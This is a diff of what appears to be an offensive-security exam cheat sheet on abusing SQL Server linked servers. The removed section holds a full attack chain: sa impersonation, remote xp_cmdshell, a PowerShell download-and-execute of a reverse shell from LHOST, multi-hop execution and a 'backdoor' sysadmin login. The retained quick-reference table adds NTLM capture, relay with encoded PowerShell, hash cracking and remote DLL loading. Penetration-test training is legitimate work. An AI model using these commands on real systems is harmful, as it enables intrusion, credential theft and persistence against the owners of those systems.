-   Note: `sp_serveroption` is a server-level setting, so low privileges usually cannot change it; this is one of the classic blockers in this scenario. Try `EXECUTE AS LOGIN='sa'` first (if it is impersonatable):
-   ```sql
-   EXECUTE AS LOGIN = 'sa';
-   EXEC sp_serveroption 'TARGET2', 'rpc out', 'true';
-   REVERT;
-   ```
-
-4. When you need `OPENQUERY`, confirm A allows distributed queries against B (data access):
-   ```sql
-   EXEC sp_serveroption 'TARGET2', 'data access', 'true';   -- also needs sufficient privileges
-   ```
-
-5. **Enable xp_cmdshell on B and execute** (prerequisite: the identity mapped on B is sysadmin, or you can impersonate B's sysadmin from A):
-   ```sql
-   EXEC ('EXEC sp_configure ''show advanced options'',1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'',1; RECONFIGURE;') AT TARGET2;
-   EXEC ('EXEC master..xp_cmdshell ''whoami''') AT TARGET2;
-   ```
-   Enable OLE remotely (backup execution channel):
-   ```sql
-   EXEC ('EXEC sp_configure ''Ole Automation Procedures'',1; RECONFIGURE;') AT TARGET2;
-   ```
-
-6. **Single-hop command execution / get a shell** (leave the long command to the download; the remote only runs a short one):
-   ```sql
-   -- way 1: a short xp_cmdshell command directly
-   EXEC ('EXEC master..xp_cmdshell ''whoami /all''') AT TARGET2;
-   -- way 2: have B download and run it (B needs outbound access to LHOST)
-   EXEC ('EXEC master..xp_cmdshell ''powershell -nop -w hidden -c "iex(iwr http://LHOST/run.ps1)"''') AT TARGET2;
-   -- way 3: the whole thing in base64 (fewest quotes):
-   EXEC ('EXEC master..xp_cmdshell ''powershell -enc <BASE64>''') AT TARGET2;
-   ```
-   For a callback: start `nc -nvlp LPORT` on the attacker first, and put run.ps1 in the HTTP directory (its content = download and execute a reverse shell).
-
-7. **Multi-hop (A→B→C) template** — the core is "send one EXEC from A to B that makes B send another EXEC to C":
-   ```sql
-   -- enumerate C: look at B's links through B
-   SELECT * FROM OPENQUERY("TARGET2", 'SELECT name, is_rpc_out_enabled FROM sys.servers');
-   -- execute on C (the whole B→C EXEC AT is wrapped as a string handed to B)
-   EXEC ('EXEC (''EXEC master..xp_cmdshell ''''whoami'''''') AT TARGET3') AT TARGET2;
-   -- multi-hop query: all quotes in the inner OPENQUERY double
-   SELECT * FROM OPENQUERY("TARGET2", 'SELECT * FROM OPENQUERY("TARGET3", ''SELECT @@SERVERNAME AS srv'')');
-   ```
-   Quote rules (extremely easy to get wrong):
-   - In the outermost SQL: strings use single quotes; a single quote inside a string → doubled `''`.
-   - `OPENQUERY` server names use double quotes; inside an outer string the double quotes stay as they are, but when an outer **PowerShell / command line** layer wraps it again, escape per that shell's rules.
-   - Full templates: `m11-linked-server-queries.sql` (with the quote levels annotated).
-
-8. Two common follow-ups once you have a sysadmin session on B:
-   - Run OS commands on B (the ways above).
-   - Add a new login on B and make it sysadmin (if you want to connect to B directly later and skip A's long chain):
-     ```sql
-     EXEC ('EXEC sp_addlogin ''backdoor'', ''P@ssw0rd!''') AT TARGET2;
-     EXEC ('EXEC sp_addsrvrolemember ''backdoor'', ''sysadmin''') AT TARGET2;
-     -- then connect directly: impacket-mssqlclient backdoor:P@ssw0rd!@B_HOST
-     ```
-     In the exam, decide whether to run persistence actions like "add a login" based on the objective; confirm the goal first.
-
-**Scripts used**:
-| Script | Purpose | Key parameters |
-|---|---|---|
-| `m11-linked-server-queries.sql` | The full link enumeration / single-hop / multi-hop / `EXEC ... AT` template set (with quote annotations) | replace `TARGET2`/`TARGET3`, etc. |
-| `m11-powerupsql-templates.ps1` | `Get-SQLServerLinkCrawl`, `Invoke-SQLAudit`, PowerShell-side wrappers for enabling xp_cmdshell | `-Instance A_HOST` |
-| `m11-sqlrecon-templates.ps1` | SQLRecon's link modules for comparison (links / linkquery / linkcmd) | `/h:A_HOST /m:linkquery` |
-| `m11-responder-relay-sql.sh` | The cleanup path when B is the "relay target" | `TARGET` |
-
-**Validation**:
-- `EXEC ('SELECT @@SERVERNAME, SYSTEM_USER') AT TARGET2` returns B's hostname and the remote user → RPC works.
-- The `xp_cmdshell 'whoami'` from step 5 returns something like `nt service\mssql$...` or `DOMAIN\svc_sql` → remote command execution works.
-- Multi-hop execution returns C's `whoami` → the chain is complete.
-- The reverse-shell listener receives a connection.
-
-**Failure branches and alternatives**:
-1. `EXEC ... AT` reports "not configured for RPC" → try running `sp_serveroption 'TARGET2','rpc out','true'` as an impersonatable sysadmin (`EXECUTE AS LOGIN='sa'`); if you cannot impersonate, switch to the read-only `OPENQUERY` path or hunt for new credentials; without RPC Out you **cannot** call stored procedures/xp_cmdshell remotely — data queries only.
-2. The remote side can execute but is not sysadmin (`xp_cmdshell` denied) → do **login enumeration + impersonation** on B: `EXEC ('SELECT name FROM sys.server_principals WHERE type IN (''U'',''S'')') AT TARGET2`; use PowerUpSQL `Invoke-SQLAuditPrivImpersonateLogin -Exploit` to find a login you can impersonate into sysadmin, then execute.
-3. On multi-hop you get `NT AUTHORITY\ANONYMOUS LOGON` / a Kerberos delegation error → the B→C link needs "credential delegation" and double-hop EXEC is blocked on some versions/configurations; alternatives: use four-part names for **data**-level access `SELECT * FROM [TARGET2]...[sysservers]`, or pull C's connection information out of B and **connect to C directly** (if the port is reachable), or take full control of B and add credentials there to connect to C directly.
-4. Command too long / too many quotes causing syntax errors → convert everything to "download + execute" short commands: let the remote run only `powershell -enc <shortBASE64>` or `curl http://LHOST/x`; generate the BASE64 locally with `iconv -t UTF-16LE | base64 -w 0` (the command itself then contains no quotes or spaces, which is the most reliable form).
-5. `OPENQUERY` reports OLE DB / distributed queries disabled → you need `data access=true` (needs sysadmin); if you do not have it, pull B's data back to A with plain `SELECT` loops and do not chase remote in-place execution.
-6. A itself is low-privilege with no impersonatable sysadmin → go back to scenario 44's "trigger outbound authentication + relay" path and lure A's SQL service account onto another target.
-
-**Exam / OPSEC notes**:
-- **Quote escaping is the biggest point-loser**: when you write a remote string, walk through "which layer am I in" in your head; copy from the script templates and change only the server name — do not hand-write the nesting.
-- Enabling `xp_cmdshell` remotely attracts DBA/EDR-style monitoring immediately (SQL Server has audit events for it); after the validation step you can consider turning it back off if the objective does not need it: `EXEC ('EXEC sp_configure ''xp_cmdshell'',0; RECONFIGURE;') AT TARGET2`.
-- Adding a backdoor login with `sp_addlogin` is a persistence action: in the exam use it only when the objective explicitly requires it or in a normally authorized environment, and record it so you can clean up afterwards.
-- First work out whether this scenario gives you **data access** or **server control**: many objectives only need you to read one table in B over the Linked Server (in which case do not mess with xp_cmdshell), and least privilege satisfies the objective first.
-
----
-
-## Module quick-reference notes
-
-| Goal | Command (example) |
+| You want to… | Use |
 |---|---|
-| Connect SQL (SQL auth) | `impacket-mssqlclient USER:PASS@TARGET` |
-| Connect SQL (Windows auth) | `impacket-mssqlclient DOMAIN/USER:PASS@TARGET -windows-auth` |
+| Connect (SQL auth) | `impacket-mssqlclient USER:PASS@TARGET` |
+| Connect (Windows auth) | `impacket-mssqlclient DOMAIN/USER:PASS@TARGET -windows-auth` |
 | Check sysadmin | `SELECT IS_SRVROLEMEMBER('sysadmin');` |
-| xp_cmdshell status | `SELECT name,value_in_use FROM sys.configurations WHERE name='xp_cmdshell';` |
-| Enable xp_cmdshell | `EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;` |
-| Trigger outbound auth (capture/relay) | `EXEC master..xp_dirtree '\\LHOST\share';` |
+| `xp_cmdshell` status | `SELECT name,value_in_use FROM sys.configurations WHERE name='xp_cmdshell';` |
+| Enable `xp_cmdshell` | `EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;` |
+| Trigger outbound auth | `EXEC master..xp_dirtree '\\LHOST\share';` |
 | Responder capture | `sudo responder -I eth0` |
-| Crack NTLMv2 with hashcat | `hashcat -m 5600 hash.txt rockyou.txt` |
+| Crack Net-NTLMv2 | `hashcat -m 5600 hash.txt rockyou.txt` |
 | Relay to an SMB target | `impacket-ntlmrelayx --no-http-server -smb2support -t smb://TARGET -c "powershell -enc <B64>"` |
 | List Linked Servers | `SELECT name,is_linked,is_rpc_out_enabled FROM sys.servers;` |
 | Single-hop query | `SELECT * FROM OPENQUERY("TARGET2", 'SELECT @@SERVERNAME');` |
 | Single-hop exec | `EXEC ('EXEC master..xp_cmdshell ''whoami''') AT TARGET2;` |
 | Enable remote RPC Out | `EXEC sp_serveroption 'TARGET2','rpc out','true';` |
 | Multi-hop exec (A→B→C) | `EXEC ('EXEC (''xp_cmdshell ''''whoami'''''') AT TARGET3') AT TARGET2;` |
-| Audit/impersonate (PowerUpSQL) | `Invoke-SQLAuditPrivImpersonateLogin -Verbose -Instance TARGET -Exploit` |
+| Audit / impersonate (PowerUpSQL) | `Invoke-SQLAuditPrivImpersonateLogin -Verbose -Instance TARGET -Exploit` |
 | CLR exec (SQLRecon) | `SQLRecon.exe /a:WinToken /h:TARGET /m:impersonate /i:sa /m:clr /dll:http://LHOST/Warhead.dll /function:Main` |
 | Short BASE64 (local) | `echo -en 'IEX (...)' \| iconv -t UTF-16LE \| base64 -w 0` |
-
-## Related script list
-
-| File | Purpose |
-|---|---|
-| `m11-linked-server-queries.sql` | Linked Server enum / single-hop / multi-hop / EXEC AT templates and quote escaping |
-| `m11-powerupsql-templates.ps1` | PowerUpSQL discovery / enum / audit / impersonate / exec / CLR templates |
-| `m11-sqlrecon-templates.ps1` | SQLRecon module counterparts (info / impersonate / xpcmd / olecmd / clr / links) |
-| `m11-responder-relay-sql.sh` | Responder / ntlmrelayx one-shot flow + prints the SQL trigger commands |
